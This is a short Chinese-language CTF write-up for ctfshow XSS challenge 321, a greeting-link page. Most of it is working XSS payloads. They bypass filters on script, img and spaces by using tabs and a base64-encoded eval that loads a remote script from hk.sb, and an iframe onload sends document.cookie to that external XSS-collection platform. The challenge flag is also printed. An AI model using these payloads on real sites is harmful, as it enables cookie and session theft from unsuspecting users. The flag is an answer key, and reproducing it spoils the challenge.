# ctfshow-xss321



##### 参考链接

其他大佬链接

feng  https://ego00.blog.csdn.net/article/details/114079028

Y4	 https://blog.csdn.net/solitudi/article/details/111568030?spm=1001.2014.3001.5501

bit   https://www.xl-bit.cn/index.php/archives/120/



```
圣诞快乐，写下祝福语，生成链接，发送给朋友，可以领取十个鸡蛋！
祝福语
请输入祝福语
 
生成链接
```

```html
既然前面是反射型xss  其实不管它是反射还是存储 
主要还是需要我们利用xss平台 获取cookie


xss平台
https://ww.rs/
https://hk.sb/

应该是过滤了script,img,空格

输入框输入
<Img sRC=//hk.sb/UfVb/test.jpg>

把空格用tab键替换就可以
    
<input	onfocus=eval(atob(this.id))	id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGsuc2IveTd4eCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=	autofocus>

<iframe	onload="window.open('https://hk.sb/y7xx'+document.cookie)"></iframe>

ctfshow{35666868-910a-4b76-8bed-74f2ddc77909}


```

